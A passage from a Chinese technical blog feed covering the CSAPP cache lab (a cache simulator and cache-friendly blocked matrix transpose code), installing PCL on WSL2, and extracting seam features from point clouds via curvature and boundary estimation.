<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">usage</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Options:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  -h         Print this help message.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  -v         Optional verbose flag.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  -t &lt;file&gt;  Trace file.\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Examples:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>主函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义返回参数</span></span><br><span class="line">Cache *myCache = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> missCount = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> hitCount = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> evictionCount = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> verbose = <span class="number">0</span>;       <span class="comment">//跟踪信息标志</span></span><br><span class="line"><span class="type">char</span> t[<span class="number">50</span>];</span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> *optarg;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="comment">//读取命令行参数</span></span><br><span class="line">    <span class="type">char</span> opt;</span><br><span class="line">    <span class="type">int</span> s, E, b;</span><br><span class="line">    <span class="type">int</span> wrongArg = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">                wrongArg = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">                verbose = <span class="number">1</span>; <span class="comment">//跟踪信息可选标志</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                s = atoi(optarg);<span class="comment">//ascii to int</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">                E = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">                b = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">                <span class="built_in">strcpy</span>(t, optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                usage();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (s &lt;= <span class="number">0</span> || E &lt;= <span class="number">0</span> || b &lt;= <span class="number">0</span> || wrongArg == <span class="number">1</span>) &#123;</span><br><span class="line">        usage();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明</span></span><br><span class="line">    </span><br><span class="line">    initCache(s, E, b);</span><br><span class="line">    getTrace(s, E, b);</span><br><span class="line">    freeCache(); </span><br><span class="line"></span><br><span class="line">    printSummary(hitCount, missCount, evictionCount);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="结果："><a href="#结果：" class="headerlink" title="结果："></a><strong>结果：</strong></h3><p><img src="/2023/11/14/CSAPP-6-cachelab/image-20231116195345436.png" alt="image-20231116195345436"></p>
<h1 id="3-Part-B"><a href="#3-Part-B" class="headerlink" title="3.Part B"></a>3.Part B</h1><p>在trans.c中编写函数，尽可能的少的缓存未命中行为。</p>
<h3 id="建议"><a href="#建议" class="headerlink" title="建议"></a><strong>建议</strong></h3><ul>
<li>每个转置函数最多可以使用12个int类型的局部变量</li>
<li>不可以使用任何long类型或者技巧来规避上一条</li>
<li>不可以使用递归</li>
<li>堆栈上局部局部变量不允许超过12个</li>
<li>转置函数不可能修改数组a，但是可以对数组b的内容执行任何想要的操作</li>
<li>不允许在代码中使用任何数组或者使用malloc的变体</li>
</ul>
<h3 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a><strong>思路：</strong></h3><ul>
<li>充分利用cache的能力，尽量不访问内存，提高矩阵的<strong>时间局部性和空间局部性</strong></li>
<li>采取直接映射<code>E = 1</code> ，需要重点注意矩阵对角线上的情况，因为如果数组A的起始地址为<code>0x30a080</code>，那数组B 的起始地址位<code>0x34a080</code>，两个数组在对角线上的元素会被映射同一块</li>
<li>给出信息<code>s = 5，E = 1, b = 5</code>,即缓存有2^5 &#x3D; 32个组， 采取直接映射（cache line），每一块（block）数据位存储了2^5 &#x3D; 32个字节也就是8个int（一个int 占据4 字节）。 所以总共有1KB的直接映射高速缓存</li>
</ul>
<p><strong>M &#x3D; 32 , N &#x3D; 32</strong></p>
<ul>
<li>数组A是以行来访问的，数组B是以列来访问，那么对于一个cache 可以存储数组的前8行所有的元素，而在访问数组B第九行的第一个元素之后，<strong>会将之前存储的八行的cache全部冲突替换</strong>，导致没有重复利用cache数据，只利用了每个块的一个元素</li>
<li>故为了提高cache，在cache载入后将cache包含的全部元素操作后在替换cache，保证不会二次载入相同的cache，设置子块的大小为<strong>8x8</strong></li>
<li>分块操作</li>
</ul>
<hr>
<p><strong>模拟一下缓存的进行转置的过程</strong></p>
<p>首先明确的是 <strong>数组在内存中是按照行存放的，多维数组也是如此</strong>，相邻的两行前一行的尾元素与下一行的首元素地址相连。（假设4X4矩阵 那么a03和a10地址相连）</p>
<p><code>Part B</code>中的cache结构如下：</p>
<p><img src="/2023/11/14/CSAPP-6-cachelab/image-20231118105957277.png" alt="image-20231118105957277"></p>
<p>这么看可能不是很好理解 如果按照数组排列 即一行存放32个数组元素可以得出下图：即每一行</p>
<p><img src="/2023/11/14/CSAPP-6-cachelab/image-20231118110846707.png" alt="image-20231118110846707"></p>
<p><strong>模拟</strong>：</p>
<ul>
<li>假设<code> A[0][0]</code> set为 00 ，那么一开始需要从内存中载入 会造成一次miss，然后令<code>temp = A[0][0]</code>，<code>B[0][0] = temp</code>，写入B的时候会先Load 一次，此时<code>B[0][0]</code>的 set 也为00，<strong>会造成第一行的驱逐</strong></li>
<li>加载<code>A[0][1]-A[0][7]</code>的时候，又会从内存中加载A数组，此时<code>B[1-7][0] = A[0][1-7]</code> 而此时<code>B[1][0]</code>的SET 与<code>A[0][1]</code>不会再相等，<strong>故只有加载时候的miss ，没有eviction</strong></li>
<li>然后继续反复。</li>
<li>到<code>A[0][8-15]</code>和<code>B[8-15][0]</code>的时候此时<code>B[0-7][0]</code>对应的SET相等，然后每次搬运的过程中 会出现大量的<code>eviction</code></li>
</ul>
<p><strong>分块的方法解决思路</strong>：</p>
<ul>
<li>将<code>32 X 32</code> 分割为<code>8 X 8</code> 如下：（参考见水印）</li>
<li><img src="https://img-blog.csdnimg.cn/img_convert/1d9c0b9e4bbaa0b75447771c85ffb2f0.png" alt="img" style="zoom:55%;"> </li>
<li>因为当 <code>SET = 0</code>的时候 <code>A[0][0-7]</code> 当<code>SET = 1</code> 此时存放的是原数组的<code>A[1][0-7]</code>而不是 上面所说的<code>A[0][8-15]</code>.</li>
<li><code>A[1][0-7]</code>转置为<code>B[0-7][1]</code>不会对cache造成<code>eviction</code> 而是补充在<code>B[0-7][0]</code>后面。</li>
</ul>
<p><strong>分块代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">0</span>; m &lt; <span class="number">32</span>; m += <span class="number">8</span>)&#123;			<span class="comment">//分块逻辑 块遍历</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> n = <span class="number">0</span>; n &lt; <span class="number">32</span>; n += <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = m; i &lt; m + <span class="number">8</span>; ++i)&#123;	<span class="comment">//行遍历</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = n; j &lt; n + <span class="number">8</span>; ++j)	<span class="comment">//列遍历</span></span><br><span class="line">            &#123;</span><br><span class="line">                B[j][i] = A[i][j];			<span class="comment">//B[0-7][0] = A[0][0-7]...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>上述代码在对角线两侧的区域已经优化的足够好了 但是对于对角线上的元素来说，每次进行转置都会映射到相同的区域会造成miss 和 eviction </li>
<li>解决方案：<strong>将A中的元素一行行的不转置防止在B中，然后对B矩阵中原地址进行转置 这样就不会造成不必要的eviction</strong>只存在替换时候的miss</li>
</ul>
<p><strong>优化代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> _0, _1, _2, _3, _4, _5, _6, _7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">0</span>; m &lt; <span class="number">32</span>; m += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> n = <span class="number">0</span>; n &lt; <span class="number">32</span>; n += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (m != n) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = m; i &lt; m + <span class="number">8</span>; ++i) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = n; j &lt; n + <span class="number">8</span>; ++j) &#123;</span><br><span class="line">                    B[j][i] = A[i][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = m; i &lt; m + <span class="number">8</span>; ++i) &#123;</span><br><span class="line">                <span class="comment">// 必须整行搬运</span></span><br><span class="line">                <span class="comment">// 这种写法相当于完全展开内层循环</span></span><br><span class="line">                _0 = A[i][n]; _1 = A[i][n + <span class="number">1</span>]; _2 = A[i][n + <span class="number">2</span>]; _3 = A[i][n + <span class="number">3</span>];</span><br><span class="line">                _4 = A[i][n + <span class="number">4</span>]; _5 = A[i][n + <span class="number">5</span>]; _6 = A[i][n + <span class="number">6</span>];  _7 = A[i][n + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                B[i][n] = _0; B[i][n + <span class="number">1</span>] = _1;  B[i][n + <span class="number">2</span>] = _2; B[i][n + <span class="number">3</span>] = _3;</span><br><span class="line">                B[i][n + <span class="number">4</span>] = _4; B[i][n + <span class="number">5</span>] = _5; B[i][n + <span class="number">6</span>] = _6; B[i][n + <span class="number">7</span>] = _7;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 原址转置！</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = m; i &lt; m + <span class="number">8</span>; ++i) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = n + (i - m + <span class="number">1</span>); j &lt; n + <span class="number">8</span>; ++j) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i != j) &#123;</span><br><span class="line">                        _0 = B[i][j];</span><br><span class="line">                        B[i][j] = B[j][i];</span><br><span class="line">                        B[j][i] = _0;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>结果：</strong></p>
<p><img src="/2023/11/14/CSAPP-6-cachelab/image-20231118115740832.png" alt="image-20231118115740832"></p>
<hr>
<p><strong>M &#x3D; 64 , N &#x3D; 64</strong></p>
<ul>
<li>如同<code>32 x 32</code> 一样可以将矩阵划分成 <code>4 X 4</code> 的子块，<strong>但是这样会导致cache没有利用完全</strong>，同样也会miss很多</li>
<li>如果使用<code>8 X 4</code>则每一个<code>cache</code>只有四个 int 数据会被利用到</li>
<li>可以把部分数据放入到数组B的cache中，避免局部变量数目的限制</li>
<li>以下参考： <a href="https://blog.csdn.net/qq_42241839/article/details/122984159">CSAPP(CMU 15-213)：Lab4 Cachelab详解-CSDN博客</a></li>
<li><img src="/2023/11/14/CSAPP-6-cachelab/image-20231119162220393.png" alt="image-20231119162220393"></li>
<li><img src="/2023/11/14/CSAPP-6-cachelab/image-20231119162459294.png" alt="image-20231119162459294"></li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submitB</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span> &#123;</span><br><span class="line">    <span class="type">int</span> bi, bj, i, j;</span><br><span class="line">    <span class="type">int</span> a, b, c, d, e, f, g, h;  <span class="comment">//8 local variables</span></span><br><span class="line">    <span class="keyword">for</span> (bi = <span class="number">0</span>; bi &lt; N; bi += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (bj = <span class="number">0</span>; bj &lt; M; bj += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (i = bi; i &lt; bi + <span class="number">4</span>; i++) &#123;</span><br><span class="line">                a = A[i][<span class="number">0</span>+bj]; b = A[i][<span class="number">1</span>+bj]; c = A[i][<span class="number">2</span>+bj]; d = A[i][<span class="number">3</span>+bj];  <span class="comment">//store a a a a</span></span><br><span class="line">                e = A[i][<span class="number">4</span>+bj]; f = A[i][<span class="number">5</span>+bj]; g = A[i][<span class="number">6</span>+bj]; h = A[i][<span class="number">7</span>+bj];  <span class="comment">//store 1 1 1 1</span></span><br><span class="line"></span><br><span class="line">                B[<span class="number">0</span>+bj][i] = a; B[<span class="number">1</span>+bj][i] = b; B[<span class="number">2</span>+bj][i] = c; B[<span class="number">3</span>+bj][i] = d;              <span class="comment">//assign a a a a</span></span><br><span class="line">                B[<span class="number">0</span>+bj][<span class="number">4</span>+i] = e; B[<span class="number">1</span>+bj][<span class="number">4</span>+i] = f; B[<span class="number">2</span>+bj][<span class="number">4</span>+i] = g; B[<span class="number">3</span>+bj][<span class="number">4</span>+i] = h;  <span class="comment">//assign 1 1 1 1 </span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (j = bj; j &lt; bj + <span class="number">4</span>; j++) &#123;</span><br><span class="line">                a = A[<span class="number">4</span>+bi][j]; b = A[<span class="number">5</span>+bi][j]; c = A[<span class="number">6</span>+bi][j]; d = A[<span class="number">7</span>+bi][j];   <span class="comment">//store e f g h</span></span><br><span class="line">                e = B[j][<span class="number">4</span>+bi]; f = B[j][<span class="number">5</span>+bi]; g = B[j][<span class="number">6</span>+bi]; h = B[j][<span class="number">7</span>+bi];   <span class="comment">//store 1 2 3 4</span></span><br><span class="line"></span><br><span class="line">                B[j][<span class="number">4</span>+bi] = a; B[j][<span class="number">5</span>+bi] = b; B[j][<span class="number">6</span>+bi] = c; B[j][<span class="number">7</span>+bi] = d;          <span class="comment">//assign e f g h</span></span><br><span class="line">                B[<span class="number">4</span>+j][<span class="number">0</span>+bi] = e; B[<span class="number">4</span>+j][<span class="number">1</span>+bi] = f; B[<span class="number">4</span>+j][<span class="number">2</span>+bi] = g; B[<span class="number">4</span>+j][<span class="number">3</span>+bi] = h;  <span class="comment">//assign 1 2 3 4</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = bi + <span class="number">4</span>; i &lt; bi + <span class="number">8</span>; i++) &#123;</span><br><span class="line">                a = A[i][<span class="number">4</span>+bj]; b = A[i][<span class="number">5</span>+bj]; c = A[i][<span class="number">6</span>+bj]; d = A[i][<span class="number">7</span>+bj]; </span><br><span class="line">                B[<span class="number">4</span>+bj][i] = a; B[<span class="number">5</span>+bj][i] = b; B[<span class="number">6</span>+bj][i] = c; B[<span class="number">7</span>+bj][i] = d; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<p><strong>M &#x3D; 61, N &#x3D; 67</strong></p>
<p>无法进行对齐，可以采用<strong>变化分块</strong>进行处理</p>
<p><strong>代码实现：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submitC</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span> &#123;</span><br><span class="line">    <span class="type">int</span> bi, bj, i, j, tmp;</span><br><span class="line">    <span class="type">int</span> block_size = <span class="number">16</span>;      <span class="comment">//子块大小：block_size * block_size</span></span><br><span class="line">    <span class="keyword">for</span> (bi = <span class="number">0</span>; bi &lt; N; bi += block_size) &#123;</span><br><span class="line">        <span class="keyword">for</span> (bj = <span class="number">0</span>; bj &lt; M; bj += block_size) &#123;</span><br><span class="line">            <span class="keyword">for</span> (i = bi; i &lt; N &amp;&amp; i &lt; bi + block_size; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (j = bj; j &lt; M &amp;&amp; j &lt; bj + block_size; j++) &#123;</span><br><span class="line">                    tmp = A[i][j];</span><br><span class="line">                    B[j][i] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="结果：-1"><a href="#结果：-1" class="headerlink" title="结果："></a><strong>结果：</strong></h3><p><img src="/2023/11/14/CSAPP-6-cachelab/image-20231119164739534.png" alt="image-20231119164739534"></p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>wsl2配置PCL并可视化</title>
    <url>/2023/12/27/wsl2%E9%85%8D%E7%BD%AEPCL%E5%B9%B6%E5%8F%AF%E8%A7%86%E5%8C%96/</url>
    <content><![CDATA[<h1 id="1-引言"><a href="#1-引言" class="headerlink" title="1.引言"></a>1.引言</h1><ul>
<li>之前在 <code>win10</code> 上安装了<code>wsl2</code>，基于<code>Ubuntu20.04</code>的系统，就想着能不能在 <code>wsl2</code> 配置 <code>PCL</code> 并实现可视化。</li>
<li>目前实现了在<code>Ubuntu20.04</code> 上 安装了 <code>PCL1.12.0</code>，并且实现了可视化。</li>
<li>就此记录一下，参考很多教程，再次表示感谢！！！</li>
</ul>
<img src="/2023/12/27/wsl2%E9%85%8D%E7%BD%AEPCL%E5%B9%B6%E5%8F%AF%E8%A7%86%E5%8C%96/image-20231227222726732.png" alt="image-20231227222726732" style="zoom:50%;">



<h1 id="2-wsl2的安装"><a href="#2-wsl2的安装" class="headerlink" title="2.wsl2的安装"></a>2.wsl2的安装</h1><ul>
<li><strong>win10的版本必须是2004以上！！！</strong></li>
<li>具体的参考了<a href="https://zhuanlan.zhihu.com/p/629314758">win10配置wsl2 - 知乎 (zhihu.com)</a>，这里不做赘述。</li>
</ul>
<h1 id="3-wsl2的GUI"><a href="#3-wsl2的GUI" class="headerlink" title="3.wsl2的GUI"></a>3.wsl2的GUI</h1><ul>
<li>最新的更新 <code>wsl2</code> 已经支持了<code>Linux</code> 的GUI</li>
<li>具体实现方式见：<a href="https://learn.microsoft.com/zh-cn/windows/wsl/tutorials/gui-apps">使用 WSL 运行 Linux GUI 应用 | Microsoft Learn</a></li>
<li>之前安装了 使用<code>wsl --update</code>更新就好，也可以安装其他的一些<code>GUI</code>的工具</li>
</ul>
<h1 id="4-PCL的安装"><a href="#4-PCL的安装" class="headerlink" title="4.PCL的安装"></a>4.PCL的安装</h1><ul>
<li>具体的思路就跟在平时安装一样，但需要注意几个点。</li>
<li>可以参照<a href="https://blog.csdn.net/m0_48919875/article/details/123863892">ubuntu20.04下安装pcl_ubuntu20.04安装pcl-CSDN博客</a>这篇博客的安装方法</li>
<li>在安装过程中可能存在的问题：<ul>
<li><code>VTK</code>的安装过程中 缺<code>QT</code>的依赖，直接进行安装就行，解决方案：<a href="https://blog.csdn.net/m0_56035193/article/details/123615445">解决Cmake的一个小问题及QT4与QT5的安装和切换_cmake error at &#x2F;usr&#x2F;share&#x2F;cmake-3.16&#x2F;modules&#x2F;findq-CSDN博客</a></li>
<li>报错信息：<code>CMake Error at /usr/share/cmake-3.16/Modules/FindQt4</code></li>
<li>在 <code>PCL</code>文件 <code>make</code>的时候，可能存在一些问题：<ul>
<li>若采用<code>make -j8</code>或<code>-j4</code>，可能因为CPU性能不够导致系统重启，降低进程数或者使用<code>make</code>即可</li>
<li><code>C++: fatal error: Killed signal terminated program cc1plus</code>报错，内存分配不足，解决方法见：<a href="https://blog.csdn.net/YiWHuang/article/details/125199044">C++: fatal error: Killed signal terminated program cc1plus的问题解决-CSDN博客</a></li>
</ul>
</li>
</ul>
</li>
<li>我所遇到的问题大概是如上这些，解决完这些也就安装成功可以用了。</li>
</ul>
]]></content>
      <categories>
        <category>环境安装</category>
      </categories>
      <tags>
        <tag>PCL</tag>
        <tag>wsl</tag>
      </tags>
  </entry>
  <entry>
    <title>对缝融合特征提取</title>
    <url>/2024/03/16/%E5%AF%B9%E7%BC%9D%E8%9E%8D%E5%90%88%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96/</url>
    <content><![CDATA[<h1 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h1><p><strong>出发点：</strong></p>
<ul>
<li>在对缝的间隙和阶差的测量过程，对缝结构的正确，完整提取是非常重要的。</li>
<li>实际的点云采集过程中，易受到环境光照条件，以及被测量物体的表面反光条件的影响，点云的密度分布是不规律的，会收到光环境的影响，不再是传统意义上的在边界部分，或者拐角部分的密度大，<strong>密度差异不一致</strong> —— 对缝结构采取 密度差异提取不可行。</li>
<li>融合曲率与边界特征提取，能极大的提高特征提取算法的鲁棒性。</li>
</ul>
<p>如下图：点云的密度分布不均匀，采用密度分割 无法将特征提取。</p>
<img src="/2024/03/16/%E5%AF%B9%E7%BC%9D%E8%9E%8D%E5%90%88%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96/image-20240316162943455.png" alt="密度分布不均匀" style="zoom:50%;">

<p>因此提出曲率边界融合特征提取：</p>
<ul>
<li>点云的曲率特征能够很大程度上的保留关键特征信息</li>
<li>点云的边界特征能够保留轮廓的信息</li>
</ul>
<h1 id="二、实现"><a href="#二、实现" class="headerlink" title="二、实现"></a>二、实现</h1><p><strong>曲率估计</strong></p>
<p>PCL中的曲率有两个 一个是 <code>NormalEstimation</code>中的曲率 ，另一个是<code>PrincipalCurvaturesEstimation</code>  .</p>
<ul>
<li>前者表示是表面曲率，即表示表面的起伏程度；</li>
<li>后者见下图，曲率估计出来有两个值，一个最大，一个最小曲率—&gt;即可求平均曲率</li>
</ul>
<img src="/2024/03/16/%E5%AF%B9%E7%BC%9D%E8%9E%8D%E5%90%88%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96/image-20240316171027015.png" alt="image-20240316171027015" style="zoom: 67%;">

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">   <span class="comment">// 计算</span></span><br><span class="line">pcl::PrincipalCurvaturesEstimation&lt;pcl::PointXYZ, pcl::Normal, pcl::PrincipalCurvatures&gt;pointCur;</span><br><span class="line">pcl::PointCloud&lt;pcl::PrincipalCurvatures&gt;::<span class="function">Ptr <span class="title">cloudCurvature</span><span class="params">(<span class="keyword">new</span> pcl::PointCloud&lt;pcl::PrincipalCurvatures&gt;)</span></span>;</span><br><span class="line">pointCur.<span class="built_in">setInputCloud</span>(cloud);</span><br><span class="line">pointCur.<span class="built_in">setInputNormals</span>(normals);</span><br><span class="line">pointCur.<span class="built_in">setSearchMethod</span>(tree);</span><br><span class="line">pointCur.<span class="built_in">setRadiusSearch</span>(<span class="number">0.5</span>);</span><br><span class="line">pointCur.<span class="built_in">compute</span>(*cloudCurvature);</span><br><span class="line"><span class="comment">// 保存</span></span><br><span class="line"><span class="type">int</span> cloudCurSize = cloudCurvature-&gt;<span class="built_in">size</span>();</span><br><span class="line">vector&lt;<span class="type">float</span>&gt; tempCur;</span><br><span class="line"><span class="type">float</span> meanCur = <span class="number">0.0</span>, curThreshold = <span class="number">0.001</span>;</span><br><span class="line">   std::unordered_set&lt;<span class="type">int</span>&gt; pointIdxSet;</span><br><span class="line">       </span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; cloudCurSize; i++)&#123;</span><br><span class="line">	meanCur = (cloudCurvature-&gt;points[i].pc1 + cloudCurvature-&gt;points[i].pc2) / <span class="number">2</span>; <span class="comment">// 平均曲率</span></span><br><span class="line">	tempCur.<span class="built_in">push_back</span>(meanCur);</span><br><span class="line">	<span class="keyword">if</span> (meanCur &gt; curThreshold)&#123;</span><br><span class="line">                pointIdxSet.<span class="built_in">insert</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<p><strong>边界计算</strong></p>
<p>参考文献：Bendels G H , Schnabel R , Klein R .Detecting Holes in Point Set Surfaces[J].Journal of WSCG, 2006, 14.</p>
<p>边界计算采用<code>BoundaryEstimation</code>，其原理即：</p>
<ul>
<li>搜索每个点的邻域信息，建立点 到其邻域点的连线</li>
<li>统计每两个连线之间的夹角值，</li>
<li>超过给定的阈值即为边界点</li>
</ul>
<img src="/2024/03/16/%E5%AF%B9%E7%BC%9D%E8%9E%8D%E5%90%88%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96/image-20240316172453892.png" alt="image-20240316172453892" style="zoom:150%;">

<h1 id="三、结果"><a href="#三、结果" class="headerlink" title="三、结果"></a>三、结果</h1><p>曲面的对缝：</p>
<p><img src="/2024/03/16/%E5%AF%B9%E7%BC%9D%E8%9E%8D%E5%90%88%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96/image-20240316172630043.png" alt="image-20240316172630043"></p>
<p>平面的对缝：</p>
<p><img src="/2024/03/16/%E5%AF%B9%E7%BC%9D%E8%9E%8D%E5%90%88%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96/image-20240316172708011.png" alt="image-20240316172708011"></p>
<p>均能提取出对缝特征，并且在划分测量小区间方面，融合特征算法也表现不错。划分的区间数量稳定。</p>
<p><strong>区间划分示意图：</strong></p>
<img src="/2024/03/16/%E5%AF%B9%E7%BC%9D%E8%9E%8D%E5%90%88%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96/image-20240317165722491.png" alt="image-20240317165722491" style="zoom:50%;">

<p><strong>平面：</strong></p>
<table>
<thead>
<tr>
<th align="center"><strong>平面</strong></th>
<th align="center"></th>
<th align="center"></th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center"></td>
<td align="center"><strong>融合</strong> （个）</td>
<td align="center"><strong>仅曲率</strong></td>
<td align="center"><strong>仅边界</strong></td>
</tr>
<tr>
<td align="center"><strong>1</strong></td>
<td align="center"><strong>57</strong></td>
<td align="center"><strong>57</strong></td>
<td align="center"><strong>59</strong></td>
</tr>
<tr>
<td align="center"><strong>0.9</strong></td>
<td align="center"><strong>57</strong></td>
<td align="center"><strong>57</strong></td>
<td align="center"><strong>57</strong></td>
</tr>
<tr>
<td align="center"><strong>0.8</strong></td>
<td align="center"><strong>58</strong></td>
<td align="center"><strong>58</strong></td>
<td align="center"><strong>58</strong></td>
</tr>
<tr>
<td align="center"><strong>0.7</strong></td>
<td align="center"><strong>57</strong></td>
<td align="center"><strong>57</strong></td>
<td align="center"><strong>57</strong></td>
</tr>
<tr>
<td align="center"><strong>0.6</strong></td>
<td align="center"><strong>55</strong></td>
<td align="center"><strong>55</strong></td>
<td align="center"><strong>56</strong></td>
</tr>
<tr>
<td align="center"><strong>0.5</strong></td>
<td align="center"><strong>55</strong></td>
<td align="center"><strong>55</strong></td>
